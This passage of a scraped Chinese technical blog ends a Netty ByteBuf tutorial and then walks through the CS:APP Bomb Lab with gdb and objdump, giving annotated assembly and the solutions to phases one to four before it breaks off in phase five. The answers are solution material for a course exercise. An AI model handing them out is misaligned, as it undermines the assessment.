Charset.forName(&quot;utf-8&quot;)); // 判断是否为堆缓存，如果是堆缓存，返回true if (byteBuf.hasArray()) { byte[] bytes = byteBuf.array(); System.out.println(new String(bytes, Charset.forName(&quot;utf-8&quot;))); System.out.println(byteBuf); System.out.println(byteBuf.arrayOffset()); // 可读字节第一偏移量 System.out.println(byteBuf.readerIndex()); System.out.println(byteBuf.writerIndex()); System.out.println(byteBuf.capacity()); } }} 输出： hello world UnpooledByteBufAllocator$InstrumentedUnpooledUnsafeHeapByteBuf(ridx: 0, widx: 11, cap: 33)001133 ridx 表示读的 index，widx 表示写的 index 我们来看看复合 Buffer public class ByteBufTest03 { public static void main(String[] args) { // 新建一个复合 buffer CompositeByteBuf compositeByteBuf = Unpooled.compositeBuffer(); ByteBuf heapBuf = Unpooled.buffer(10); ByteBuf directBuf = Unpooled.directBuffer(8); compositeByteBuf.addComponent(heapBuf); compositeByteBuf.addComponent(directBuf); compositeByteBuf.forEach(System.out::println); // 输出 // UnpooledSlicedByteBuf(ridx: 0, widx: 0, cap: 0/0, unwrapped: UnpooledByteBufAllocator$InstrumentedUnpooledUnsafeHeapByteBuf(ridx: 0, widx: 0, cap: 10)) // UnpooledSlicedByteBuf(ridx: 0, widx: 0, cap: 0/0, unwrapped: UnpooledByteBufAllocator$InstrumentedUnpooledUnsafeNoCleanerDirectByteBuf(ridx: 0, widx: 0, cap: 8)) }} Netty 提供的 3 种缓冲区heap buffer（堆缓冲区）： 这是最常见的类型，ByteBuf 将数据存储到 JVM 的堆空间中，并且将实际的数据放到 byte 数组中来实现的 优点：由于数据是存储在 JVM 的堆中，因此可以快速的创建和快速的释放，并且它提供了 直接访问内部字节数组的方法 缺点：每次读写数据时，都需要先将数据复制到直接缓冲中再进行网络传输 direct buffer（直接缓冲区）： 在堆之外直接分配内存空间，直接缓冲区并不会占用堆的容量空间，因为他是有操作系统在本地内存进行的数据分配 优点：在使用 Socket 进行数据传输时，性能非常好，因为数据直接位于操作系统的本地内存中，所以不需要从 JVM 将数据复制到直接缓冲区 缺点：因为 Direct Buffer 是直接在操作系统内存中的，所以内存空间分配与释放要比堆空间更加复杂，而且速度要慢一些 Netty 通过提供内存池来解决这个问题，直接缓冲区并不支持通过字节数组的方式来访问数据 重点：对于后端的业务消息的编解码来说，推荐使用 HeapByteBuf；对于 I/O 通信的读写缓冲区，我们推荐使用 DirectBytebuf composite buffer（符合缓冲区）： 复合缓冲区实际上是将多个缓冲区实例组合起来，并向外提供一个统一视图。像是一个缓冲区的 List JDK 的 ByteBuffer 与 Netty 的 ByteBuf 之间的差异比对 Netty 的 ByteBuf 采用了读写分离的策略（readerIndex 和 writeerIndex），一个初始化（里面尚未有任何数据）的 ByteBuf 的 readerIndex 与 writerIndex 的值都为0 当数索引与写索引处于同一个位置时，如果我们继续读取，那么就会抛出 IndexOutOfBoundsException 对于ByteBuf 的任何读写操作都会分别单独维护读索引和写索引，MaxCapacity 最大的容量默认为Integer.MAX_VALUE JDK 的 ByteBuffer的缺点： final byte[] hb; 这是JDK的ByteBuffer对象中用于储存的对象声明，可以看到，其字节数组布尔声明为final的，也就是长度是固定不变的，一旦分配好后就不能动态扩容与收缩，而且当储存的数据字节很大时就很有可能出现IndexOutOfBoundsException，如果要预防着个异常，那就需要再储存之前完全确定好待储存的字节的大小，如果ByteBuffer的空间不足，我们只有一种解决方案，那就是创建新的ByteBuffer对象，然后再将之前的ByteBuffer中的数据复制过去，这一切操作都需要由开发者自己来手动完成的 ByteBuffer 只使用一个position 指针来标识位置信息，在进行读写切换时就需要调用flip方法或则是rewind 方法，使用很不方便 Netty 的 ByteBuf 的优点： 储存字节的数组是动态的，其最大值默认是Integer.MAX_VALUE，这里的动态性是体现在write方法中的，write方法执行会判断buffer容量，如果不足则会自动扩容 ByteBuf的读写索引是完成分开的，使用起来很方便 // io.netty.buffer.AbstractByteBuf#writeByte @Override public ByteBuf writeByte(int value) { ensureWritable0(1); // 会先判断是否够写入一个字节 _setByte(writerIndex++, value); return this; }// io.netty.buffer.AbstractByteBuf#ensureWritable0// 会自动扩容 final void ensureWritable0(int minWritableBytes) { ensureAccessible(); if (minWritableBytes &lt;= writableBytes()) { return; } if (minWritableBytes &gt; maxCapacity - writerIndex) { throw new IndexOutOfBoundsException(String.format( &quot;writerIndex(%d) + minWritableBytes(%d) exceeds maxCapacity(%d): %s&quot;, writerIndex, minWritableBytes, maxCapacity, this)); } // Normalize the current capacity to the power of 2. int newCapacity = alloc().calculateNewCapacity(writerIndex + minWritableBytes, maxCapacity); // Adjust to the new capacity. capacity(newCapacity); }","link":"/2019/01/19/Netty_%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E5%9B%9B%EF%BC%89/"},{"title":"Bomb Lab","text":"介绍邪恶博士在我们的班级机器上植入了许多“二进制炸弹”。二进制炸弹是一个由一系列阶段组成的程序。每个阶段都要求你在 stdin 上输入入特定的字符串。如果你输入正确的字符串，则该阶段将被消除，炸弹将进入下一个阶段。否则，炸弹通过打印“ BOOM !!!”而爆炸。然后终止。当每个阶段都已消除时，炸弹便已消除。 获取炸弹进入官网下载 bomb.tar 文件，通过 tar -xvf bomb.tar 解压，会得到 3 个文件。 README bomb：可执行二进制炸弹 bomb.c：源文件包含炸弹的主要程序以及引导程序 一共有 6 个阶段，前 4 个阶段每个 10 分，后面两个比较难每个 15 分，在拆炸弹的过程中，每次引爆一次会从总分里扣 0.5 分（最多扣 20 分）。 小技巧有一些小提示需要注意: 为了防止引爆炸弹，需要学会设置断点，在“炸弹”之前设置断点，防止爆炸 反编译出来的汇编代码很长，并不需要搞懂每行，通过 debugger 观察程序执行变化，根据这些信息去拆除炸弹 工具 gdb：命令行调试器，可以一行行地追踪程序，设置断点，查看寄存器和内存 objdump -t：输出炸弹程序的符号表。符号表里包含了所有函数和全局变量的名字 ojbdump -d ：反编译二进制文件，输出汇编代码 准备 汇编知识：汇编入门 gdb 知识 gdb bomb 进入调试状态 run 运行 break phase_1 打断点 next 简写 n 表示下一行代码 C 语言代码 nexti 简写 ni 表示下一行汇编代码 continue 简写 c 表示下一个断点 disas 显示汇编 info registers 查看寄存器的值 x/s $rax 以字符串形式查看 实验部分在命令行中反编译可执行文件，输入到 bomb.txt 文件中 objdump -d bomb &gt; bomb.txt 我们先看一下 main 函数，一共 6 个阶段，每个阶段都是一个 phase_x 的函数，在函数正常结束之后运行phase_defused拆除这个阶段，然后进入下一阶段。 400e19: e8 84 05 00 00 callq 4013a2 &lt;initialize_bomb&gt;400e1e: bf 38 23 40 00 mov $0x402338,%edi400e23: e8 e8 fc ff ff callq 400b10 &lt;puts@plt&gt;400e28: bf 78 23 40 00 mov $0x402378,%edi400e2d: e8 de fc ff ff callq 400b10 &lt;puts@plt&gt;400e32: e8 67 06 00 00 callq 40149e &lt;read_line&gt;400e37: 48 89 c7 mov %rax,%rdi400e3a: e8 a1 00 00 00 callq 400ee0 &lt;phase_1&gt;400e3f: e8 80 07 00 00 callq 4015c4 &lt;phase_defused&gt;400e44: bf a8 23 40 00 mov $0x4023a8,%edi400e49: e8 c2 fc ff ff callq 400b10 &lt;puts@plt&gt;400e4e: e8 4b 06 00 00 callq 40149e &lt;read_line&gt;400e53: 48 89 c7 mov %rax,%rdi400e56: e8 a1 00 00 00 callq 400efc &lt;phase_2&gt;400e5b: e8 64 07 00 00 callq 4015c4 &lt;phase_defused&gt;400e60: bf ed 22 40 00 mov $0x4022ed,%edi400e65: e8 a6 fc ff ff callq 400b10 &lt;puts@plt&gt;400e6a: e8 2f 06 00 00 callq 40149e &lt;read_line&gt;400e6f: 48 89 c7 mov %rax,%rdi400e72: e8 cc 00 00 00 callq 400f43 &lt;phase_3&gt;400e77: e8 48 07 00 00 callq 4015c4 &lt;phase_defused&gt;400e7c: bf 0b 23 40 00 mov $0x40230b,%edi400e81: e8 8a fc ff ff callq 400b10 &lt;puts@plt&gt;400e86: e8 13 06 00 00 callq 40149e &lt;read_line&gt;400e8b: 48 89 c7 mov %rax,%rdi400e8e: e8 79 01 00 00 callq 40100c &lt;phase_4&gt;400e93: e8 2c 07 00 00 callq 4015c4 &lt;phase_defused&gt;400e98: bf d8 23 40 00 mov $0x4023d8,%edi400e9d: e8 6e fc ff ff callq 400b10 &lt;puts@plt&gt;400ea2: e8 f7 05 00 00 callq 40149e &lt;read_line&gt;400ea7: 48 89 c7 mov %rax,%rdi400eaa: e8 b3 01 00 00 callq 401062 &lt;phase_5&gt;400eaf: e8 10 07 00 00 callq 4015c4 &lt;phase_defused&gt;400eb4: bf 1a 23 40 00 mov $0x40231a,%edi400eb9: e8 52 fc ff ff callq 400b10 &lt;puts@plt&gt;400ebe: e8 db 05 00 00 callq 40149e &lt;read_line&gt;400ec3: 48 89 c7 mov %rax,%rdi400ec6: e8 29 02 00 00 callq 4010f4 &lt;phase_6&gt;400ecb: e8 f4 06 00 00 callq 4015c4 &lt;phase_defused&gt; 阶段一我们从上面我们可以看到调用了 phase_1 函数，找到对应的汇编代码。 ... 400e32: e8 67 06 00 00 callq 40149e &lt;read_line&gt; # 获取stdin输入的值 400e37: 48 89 c7 mov %rax,%rdi # 把输入值保存到 %rdi 寄存器中 400e3a: e8 a1 00 00 00 callq 400ee0 &lt;phase_1&gt; ... 0000000000400ee0 &lt;phase_1&gt;: 400ee0: 48 83 ec 08 sub $0x8,%rsp # 压栈 400ee4: be 00 24 40 00 mov $0x402400,%esi # 把$0x402400的地址保存%rsi中，%esi就%rsi的低位 400ee9: e8 4a 04 00 00 callq 401338 &lt;strings_not_equal&gt; # 比较%rdi和%rsi的值，是否不相同,%rdi是我们输入的。如果不相同返回1，相同返回0 400eee: 85 c0 test %eax,%eax # test a,b =&gt; b&amp;a，结果只保存在%rax中 400ef0: 74 05 je 400ef7 &lt;phase_1+0x17&gt; # 如果%rax为0则跳转 400ef2: e8 43 05 00 00 callq 40143a &lt;explode_bomb&gt; 400ef7: 48 83 c4 08 add $0x8,%rsp 400efb: c3 retq 上面分析的很清楚了，我们开始拆吧，在终端输入 gdb bomb 进入调试模式 &gt;(gdb) break phase_1 # 打断点Breakpoint 1 at 0x400ee0&gt;(gdb) break explode_bomb # 打断点Breakpoint 2 at 0x40143a&gt;(gdb) run # 运行Starting program: /home/ubuntu/cuzz/csapp/bomb/bombWelcome to my fiendish little bomb. You have 6 phases withwhich to blow yourself up. Have a nice day!&gt;hello world! 这个时候使用 info registers 查看寄存器信息。 &gt; (gdb) info registersrax 0x603780 6305664rbx 0x402210 4203024rcx 0xc 12rdx 0x1 1rsi 0x603780 6305664rdi 0x603780 6305664rbp 0x0 0x0rsp 0x7fffffffe378 0x7fffffffe378r8 0x603780 6305664r9 0x7c 124r10 0xfffffffffffff28e -3442r11 0x7ffff7e06400 140737352066048r12 0x400c90 4197520r13 0x7fffffffe470 140737488348272r14 0x0 0r15 0x0 0rip 0x400ee0 0x400ee0 &lt;phase_1&gt;eflags 0x206 [ PF IF ]cs 0x33 51ss 0x2b 43ds 0x0 0es 0x0 0fs 0x0 0gs 0x0 0 使用 disas 查看执行到哪一步了，stepi 可以使汇编一步一步执行，具体可以看箭头变化。 &gt;(gdb) disas # 反汇编Dump of assembler code for function phase_1:=&gt; 0x0000000000400ee0 &lt;+0&gt;: sub $0x8,%rsp # 箭头在这里 0x0000000000400ee4 &lt;+4&gt;: mov $0x402400,%esi 0x0000000000400ee9 &lt;+9&gt;: callq 0x401338 &lt;strings_not_equal&gt; 0x0000000000400eee &lt;+14&gt;: test %eax,%eax 0x0000000000400ef0 &lt;+16&gt;: je 0x400ef7 &lt;phase_1+23&gt; 0x0000000000400ef2 &lt;+18&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000400ef7 &lt;+23&gt;: add $0x8,%rsp 0x0000000000400efb &lt;+27&gt;: retqEnd of assembler dump.Breakpoint 1, 0x0000000000400ee0 in phase_1 ()&gt;(gdb) stepi # 运行第一次0x0000000000400ee4 in phase_1 ()&gt;(gdb) stepi # 运行第二次0x0000000000400ee9 in phase_1 ()&gt;(gdb) disasDump of assembler code for function phase_1: 0x0000000000400ee0 &lt;+0&gt;: sub $0x8,%rsp 0x0000000000400ee4 &lt;+4&gt;: mov $0x402400,%esi=&gt; 0x0000000000400ee9 &lt;+9&gt;: callq 0x401338 &lt;strings_not_equal&gt; # 运行两次，箭头像下移动两行 0x0000000000400eee &lt;+14&gt;: test %eax,%eax 0x0000000000400ef0 &lt;+16&gt;: je 0x400ef7 &lt;phase_1+23&gt; 0x0000000000400ef2 &lt;+18&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000400ef7 &lt;+23&gt;: add $0x8,%rsp 0x0000000000400efb &lt;+27&gt;: retqEnd of assembler dump. 我是用 x/s $rdi 和 x/s $rsi 查看寄存器的值 &gt;(gdb) x/s $rdi0x603780 &lt;input_strings&gt;: &quot;hello world!&quot;&gt;(gdb) x/s $rsi0x402400: &quot;Border relations with Canada have never been better.&quot; 就是比较这两个值是否相等，所以我们只要把这值记下来就可以拆调第一个炸弹了。 我们重新执行一遍，把 Border relations with Canada have never been better. 这段话输入进去，发现拆除了第一炸弹。 阶段二同样我们先找到 phase_2 对应的汇编代码，从函数名 read_six_numbers 提示我们输入 6 个数字。 0000000000400efc &lt;phase_2&gt;: 400efc: 55 push %rbp 400efd: 53 push %rbx 400efe: 48 83 ec 28 sub $0x28,%rsp 400f02: 48 89 e6 mov %rsp,%rsi 400f05: e8 52 05 00 00 callq 40145c &lt;read_six_numbers&gt; ... 虽然我们知道 read_six_numbers 这个函数是提示我们输入 6 个数据， 但是我们不知道输入这 6 个数字的格式是怎样的，我们先输入123456 试试看。 我们先看看这个函数，对应的汇编，通过打断点 break read_six_numbers 进入。 &gt;(gdb) disasDump of assembler code for function read_six_numbers: 0x000000000040145c &lt;+0&gt;: sub $0x18,%rsp 0x0000000000401460 &lt;+4&gt;: mov %rsi,%rdx # %rdx存放第一个值 0x0000000000401463 &lt;+7&gt;: lea 0x4(%rsi),%rcx # %rcx = %rsi + 0x4 放第二个值 0x0000000000401467 &lt;+11&gt;: lea 0x14(%rsi),%rax # 保存在栈中 %rsi + 0x14 放第六个值 0x000000000040146b &lt;+15&gt;: mov %rax,0x8(%rsp) 0x0000000000401470 &lt;+20&gt;: lea 0x10(%rsi),%rax # 保存在栈中 %rsi + 0x10 放第五个值 0x0000000000401474 &lt;+24&gt;: mov %rax,(%rsp) 0x0000000000401478 &lt;+28&gt;: lea 0xc(%rsi),%r9 # %r9 = %rsi + 0xc 放第四个值 0x000000000040147c &lt;+32&gt;: lea 0x8(%rsi),%r8 # %r8 = %rsi + 0x8 放第三个值 0x0000000000401480 &lt;+36&gt;: mov $0x4025c3,%esi 0x0000000000401485 &lt;+41&gt;: mov $0x0,%eax=&gt; 0x000000000040148a &lt;+46&gt;: callq 0x400bf0 &lt;__isoc99_sscanf@plt&gt; # 一个获取输入的函数: int sscanf( const char *buffer, const char *format [, argument ] ... ); 0x000000000040148f &lt;+51&gt;: cmp $0x5,%eax 0x0000000000401492 &lt;+54&gt;: jg 0x401499 &lt;read_six_numbers+61&gt; 0x0000000000401494 &lt;+56&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000401499 &lt;+61&gt;: add $0x18,%rsp 0x000000000040149d &lt;+65&gt;: retqEnd of assembler dump. &gt;(gdb) x/s $rsi0x4025c3: &quot;%d %d %d %d %d %d&quot; # 以这种格式获取数据(gdb) x/s $rdi&gt;0x6037d0 &lt;input_strings+80&gt;: &quot;123456&quot; # 我们输入的数据，所以我们这样输入不对的 首先看看第一个数是否为 1，然后循环判断后面一个数是否是前面一个数的倍数。 (gdb) disasDump of assembler code for function phase_2: 0x0000000000400efc &lt;+0&gt;: push %rbp # 基指针 0x0000000000400efd &lt;+1&gt;: push %rbx # 基址寄存器 0x0000000000400efe &lt;+2&gt;: sub $0x28,%rsp 0x0000000000400f02 &lt;+6&gt;: mov %rsp,%rsi 0x0000000000400f05 &lt;+9&gt;: callq 0x40145c &lt;read_six_numbers&gt;=&gt; 0x0000000000400f0a &lt;+14&gt;: cmpl $0x1,(%rsp) # 第一个参数必须为1 0x0000000000400f0e &lt;+18&gt;: je 0x400f30 &lt;phase_2+52&gt; 0x0000000000400f10 &lt;+20&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000400f15 &lt;+25&gt;: jmp 0x400f30 &lt;phase_2+52&gt; # 跳到52 0x0000000000400f17 &lt;+27&gt;: mov -0x4(%rbx),%eax # %rax = before 0x0000000000400f1a &lt;+30&gt;: add %eax,%eax # %rax = 2 * before 0x0000000000400f1c &lt;+32&gt;: cmp %eax,(%rbx) # %rax与(%rbx)比较 0x0000000000400f1e &lt;+34&gt;: je 0x400f25 &lt;phase_2+41&gt; 0x0000000000400f20 &lt;+36&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000400f25 &lt;+41&gt;: add $0x4,%rbx 0x0000000000400f29 &lt;+45&gt;: cmp %rbp,%rbx # 循环跳出来 0x0000000000400f2c &lt;+48&gt;: jne 0x400f17 &lt;phase_2+27&gt; 0x0000000000400f2e &lt;+50&gt;: jmp 0x400f3c &lt;phase_2+64&gt; 0x0000000000400f30 &lt;+52&gt;: lea 0x4(%rsp),%rbx # --&gt; 对应下面 0x04 0x0000000000400f35 &lt;+57&gt;: lea 0x18(%rsp),%rbp # --&gt; 对应下面 0x18 0x0000000000400f3a &lt;+62&gt;: jmp 0x400f17 &lt;phase_2+27&gt; # 跳回到 27 0x0000000000400f3c &lt;+64&gt;: add $0x28,%rsp 0x0000000000400f40 &lt;+68&gt;: pop %rbx 0x0000000000400f41 &lt;+69&gt;: pop %rbp 0x0000000000400f42 &lt;+70&gt;: retqEnd of assembler dump. 对应内存中的值 0x7fffffffe368 0x28 -&gt; %rbp 0x24 0x20 0x1c 0x18 -&gt; %rbx 0x14 32 0x10 16 0x0c 8 0x08 4 0x04 20x7fffffffe340 0x00 1 -&gt; %rsp 最好我们输入 1 2 4 8 16 32 查看结果，就已经通过了 阶段三同样我们先找到 phase_3 对应的汇编 Dump of assembler code for function phase_3:=&gt; 0x0000000000400f43 &lt;+0&gt;: sub $0x18,%rsp 0x0000000000400f47 &lt;+4&gt;: lea 0xc(%rsp),%rcx 0x0000000000400f4c &lt;+9&gt;: lea 0x8(%rsp),%rdx 0x0000000000400f51 &lt;+14&gt;: mov $0x4025cf,%esi 0x0000000000400f56 &lt;+19&gt;: mov $0x0,%eax 0x0000000000400f5b &lt;+24&gt;: callq 0x400bf0 &lt;__isoc99_sscanf@plt&gt; 0x0000000000400f60 &lt;+29&gt;: cmp $0x1,%eax 0x0000000000400f63 &lt;+32&gt;: jg 0x400f6a &lt;phase_3+39&gt; 0x0000000000400f65 &lt;+34&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000400f6a &lt;+39&gt;: cmpl $0x7,0x8(%rsp) # 不能大于7，也不能小于0，0x8(%rsp)这个地址存放着第一个参数 0x0000000000400f6f &lt;+44&gt;: ja 0x400fad &lt;phase_3+106&gt; 0x0000000000400f71 &lt;+46&gt;: mov 0x8(%rsp),%eax # 把第一个参数放入%rax中 0x0000000000400f75 &lt;+50&gt;: jmpq *0x402470(,%rax,8) # D(Rb, Ri, S) =&gt; Mem[Reg[Rb]+S*Reg[Ri]+D] = %rax * 8 + 0x402470 0x0000000000400f7c &lt;+57&gt;: mov $0xcf,%eax 0x0000000000400f81 &lt;+62&gt;: jmp 0x400fbe &lt;phase_3+123&gt; 0x0000000000400f83 &lt;+64&gt;: mov $0x2c3,%eax 0x0000000000400f88 &lt;+69&gt;: jmp 0x400fbe &lt;phase_3+123&gt; 0x0000000000400f8a &lt;+71&gt;: mov $0x100,%eax 0x0000000000400f8f &lt;+76&gt;: jmp 0x400fbe &lt;phase_3+123&gt; 0x0000000000400f91 &lt;+78&gt;: mov $0x185,%eax 0x0000000000400f96 &lt;+83&gt;: jmp 0x400fbe &lt;phase_3+123&gt; 0x0000000000400f98 &lt;+85&gt;: mov $0xce,%eax 0x0000000000400f9d &lt;+90&gt;: jmp 0x400fbe &lt;phase_3+123&gt; 0x0000000000400f9f &lt;+92&gt;: mov $0x2aa,%eax 0x0000000000400fa4 &lt;+97&gt;: jmp 0x400fbe &lt;phase_3+123&gt; 0x0000000000400fa6 &lt;+99&gt;: mov $0x147,%eax 0x0000000000400fab &lt;+104&gt;: jmp 0x400fbe &lt;phase_3+123&gt; 0x0000000000400fad &lt;+106&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000400fb2 &lt;+111&gt;: mov $0x0,%eax 0x0000000000400fb7 &lt;+116&gt;: jmp 0x400fbe &lt;phase_3+123&gt; 0x0000000000400fb9 &lt;+118&gt;: mov $0x137,%eax 0x0000000000400fbe &lt;+123&gt;: cmp 0xc(%rsp),%eax 0x0000000000400fc2 &lt;+127&gt;: je 0x400fc9 &lt;phase_3+134&gt; 0x0000000000400fc4 &lt;+129&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000400fc9 &lt;+134&gt;: add $0x18,%rsp 0x0000000000400fcd &lt;+138&gt;: retqEnd of assembler dump.&gt;(gdb) x/s 0x4025cf # 查看输入格式0x4025cf: &quot;%d %d&quot;&gt;(gdb) x/8a 0x402470 # 对应跳转表的地址0x402470: 0x400f7c &lt;phase_3+57&gt; 0x400fb9 &lt;phase_3+118&gt;0x402480: 0x400f83 &lt;phase_3+64&gt; 0x400f8a &lt;phase_3+71&gt;0x402490: 0x400f91 &lt;phase_3+78&gt; 0x400f98 &lt;phase_3+85&gt;0x4024a0: 0x400f9f &lt;phase_3+92&gt; 0x400fa6 &lt;phase_3+99&gt; 我们又看到 sscnaf 函数，x/s 0x4025cf 查看输入格式，发现是按 %d %d 输入两个数字。在 &lt;+50&gt; 行中是一个 switch 方法，等下 C 代码如下： if (x1 &gt; 7 || x1 &lt; 0) explode_bomb();switch(x1) { case 0: if (x2 != a) explode_bomb(); break; case 1: if (x2 != b) explode_bomb(); break; ...} 假设我们输入的 x1 为 1，那么对应表的地址为 0x400fb9 &lt;phase_3+118&gt; ，所以我们 x2 的值就是 &lt;+118&gt; 中的 0x137 对应的十进制为 311。 最后我们输入 1 311 试试，已经解除 了。 阶段四有看到了 sscanf 函数，根据前面的经验，查看一下输入格式。0x8(%rsp) 存放着第一个值，0xc(%rsp) 存放着第二个值。 (gdb) disasDump of assembler code for function phase_4:=&gt; 0x000000000040100c &lt;+0&gt;: sub $0x18,%rsp 0x0000000000401010 &lt;+4&gt;: lea 0xc(%rsp),%rcx 0x0000000000401015 &lt;+9&gt;: lea 0x8(%rsp),%rdx 0x000000000040101a &lt;+14&gt;: mov $0x4025cf,%esi 0x000000000040101f &lt;+19&gt;: mov $0x0,%eax 0x0000000000401024 &lt;+24&gt;: callq 0x400bf0 &lt;__isoc99_sscanf@plt&gt; 0x0000000000401029 &lt;+29&gt;: cmp $0x2,%eax # 必须为两个值 0x000000000040102c &lt;+32&gt;: jne 0x401035 &lt;phase_4+41&gt; 0x000000000040102e &lt;+34&gt;: cmpl $0xe,0x8(%rsp) # 第一个值必须小于0xe 0x0000000000401033 &lt;+39&gt;: jbe 0x40103a &lt;phase_4+46&gt; 0x0000000000401035 &lt;+41&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x000000000040103a &lt;+46&gt;: mov $0xe,%edx 0x000000000040103f &lt;+51&gt;: mov $0x0,%esi 0x0000000000401044 &lt;+56&gt;: mov 0x8(%rsp),%edi 0x0000000000401048 &lt;+60&gt;: callq 0x400fce &lt;func4&gt; 0x000000000040104d &lt;+65&gt;: test %eax,%eax # test a,b =&gt; a &amp; b 所以func4返回的值必须为0 0x000000000040104f &lt;+67&gt;: jne 0x401058 &lt;phase_4+76&gt; 0x0000000000401051 &lt;+69&gt;: cmpl $0x0,0xc(%rsp) # 第二个值必须为0 0x0000000000401056 &lt;+74&gt;: je 0x40105d &lt;phase_4+81&gt; 0x0000000000401058 &lt;+76&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x000000000040105d &lt;+81&gt;: add $0x18,%rsp 0x0000000000401061 &lt;+85&gt;: retqEnd of assembler dump.(gdb) x/s 0x4025cf0x4025cf: &quot;%d %d&quot; 这里是一个递归，发现第一个数为 1 时，能是返回值为 0。 Dump of assembler code for function func4:=&gt; 0x0000000000400fce &lt;+0&gt;: sub $0x8,%rsp # %rdi = A %rsi = B %rdx = C 0x0000000000400fd2 &lt;+4&gt;: mov %edx,%eax # %eax = C 0x0000000000400fd4 &lt;+6&gt;: sub %esi,%eax # %eax = C - B 0x0000000000400fd6 &lt;+8&gt;: mov %eax,%ecx # %ecx = C - B 0x0000000000400fd8 &lt;+10&gt;: shr $0x1f,%ecx # 右移31位 %ecx = (C - B) &gt;&gt; 31 0x0000000000400fdb &lt;+13&gt;: add %ecx,%eax # %eax = C - B + (C - B) &gt;&gt; 31 = C - B 0x0000000000400fdd &lt;+15&gt;: sar %eax # 等效于 sar $1,%eax %eax = (C - B) / 2 0x0000000000400fdf &lt;+17&gt;: lea (%rax,%rsi,1),%ecx # %ecx = %rax + %rsi * 1 = (C - B) / 2 + B = (B + C) / 2 0x0000000000400fe2 &lt;+20&gt;: cmp %edi,%ecx # 比较 A 和 %exc =（B + C）/ 2 0x0000000000400fe4 &lt;+22&gt;: jle 0x400ff2 &lt;func4+36&gt; # (B + C) / 2 小于 A 跳转 0x0000000000400fe6 &lt;+24&gt;: lea -0x1(%rcx),%edx # %edx = （B + C) / 2 - 1 0x0000000000400fe9 &lt;+27&gt;: callq 0x400fce &lt;func4&gt; 0x0000000000400fee &lt;+32&gt;: add %eax,%eax # 返回 2 * %rax 0x0000000000400ff0 &lt;+34&gt;: jmp 0x401007 &lt;func4+57&gt; 0x0000000000400ff2 &lt;+36&gt;: mov $0x0,%eax # %eax = 0 0x0000000000400ff7 &lt;+41&gt;: cmp %edi,%ecx # 0 和 （B + C）/ 2 如果相等跳转 0x0000000000400ff9 &lt;+43&gt;: jge 0x401007 &lt;func4+57&gt; 0x0000000000400ffb &lt;+45&gt;: lea 0x1(%rcx),%esi # %esi =（B + C）/ 2 + 1 0x0000000000400ffe &lt;+48&gt;: callq 0x400fce &lt;func4&gt; # 递归调用 0x0000000000401003 &lt;+53&gt;: lea 0x1(%rax,%rax,1),%eax # 返回 2 * %rax + 1 0x0000000000401007 &lt;+57&gt;: add $0x8,%rsp 0x000000000040100b &lt;+61&gt;: retqEnd of assembler dump. 根据 x86 汇编语言的约定，%rdi、%rsi、%rdx 分别为第一、二和第三个参数使用的寄存器。%rax 作为返回值所在的寄存器。func4 变换为C语言代码如下： int func4(int target, int step, int limit) { /* edi = target; esi = step; edx = limit */ int temp = (limit - step) * 0.5; int mid = temp + step; if (mid &gt; target) { limit = mid - 1; int ret1 = func4(target, step, limit); return 2 * ret1; } else { if (mid &gt;= target) { return 0; } else { step = mid + 1; int ret2 = func4(target, step, limit); return (2 * ret2 + 1); } }} 最后看看测试结果 阶段五先看汇编代码 =&gt; 0x0000000000401062 &lt;+0&gt;: push %rbx 0x0000000000401063 &lt;+1&gt;: sub $0x20,%rsp 0x0000000000401067 &lt;+5&gt;: mov %rdi,%rbx # %rid保存输入字符串指针,复制到%rbx 0x000000000040106a &lt;+8&gt;: mov %fs:0x28,%rax 0x0000000000401073 &lt;+17&gt;: mov %rax,0x18(%rsp) # 保存%rax 0x0000000000401078 &lt;+22&gt;: xor %eax,%eax # 清零%eax 0x000000000040107a &lt;+24&gt;: callq 0x40131b &lt;string_length&gt; 0x000000000040107f &lt;+29&gt;: cmp $0x6,%eax # 必须为长度为6的字符串 0x0000000000401082 &lt;+32&gt;: je 0x4010d2 &lt;phase_5+112&gt; 0x0000000000401084 &lt;+34&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000401089 &lt;+39&gt;: jmp 0x4010d2 &lt;phase_5+112&gt; 0x000000000040108b &lt;+41&gt;: movzbl (%rbx,%rax,1),%ecx # 复制%rbx中第%rax字符串到%ecx中 0x000000000040108f &lt;+45&gt;: mov %cl,(%rsp) # %cl是%ecx低位，保存单个字符串到（%rsp）中 0x0000000000401092 &lt;+48&gt;: mov (%rsp),%rdx # 把字符串复制到%rdx中 0x0000000000401096 &lt;+52&gt;: and $0xf,%edx # 取低4位 0x0000000000401099 &lt;+55&gt;: movzbl 0x4024b0(%rdx),%edx # 将与0x4024b0偏移量为%rdx的一个字节数据复制到%edx 0x00000000004010a0 &lt;+62&gt;: mov %dl,0x10(%rsp,%rax,1) # %dl是%edx的低位，将%edx最低字节复制到与%rsp偏移量为(0x10 + %rax)的栈地址中 0x00000000004010a4 &lt;+66&gt;: add $0x1,%rax # %rax值加1，值向下一个字符串 0x00000000004010a8 &lt;+70&gt;: cmp $0x6,%rax # 判断是否等于6，不等于继续循环 0x00000000004010ac &lt;+74&gt;: jne 0x40108b &lt;phase_5+41&gt; 0x00000000004010ae &lt;+76&gt;: movb $0x0,0x16(%rsp) 0x00000000004010b3 &lt;+81&gt;: mov $0x40245e,%esi # %esi指向$0x40245e地址字符串 0x00000000004010b8 &lt;+86&gt;: lea 0x10(%rsp),%rdi # 指向前面的字符串 0x00000000004010bd &lt;+91&gt;: callq 0x401338 &lt;strings_not_equal&gt; # 判断是否相等 0x00000000004010c2 &lt;+96&gt;: test %eax,%eax 0x00000000004010c4 &lt;+98&gt;: je 0x4010d9 &lt;phase_5+119&gt; 0x00000000004010c6 &lt;+100&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x00000000004010cb &lt;+105&gt;: nopl 0x0(%rax,%rax,1) 0x00000000004010d0 &lt;+110&gt;: jmp 0x4010d9 &lt;phase_5+119&gt; 0x00000000004010d2 &lt;+112&gt;: mov $0x0,%eax 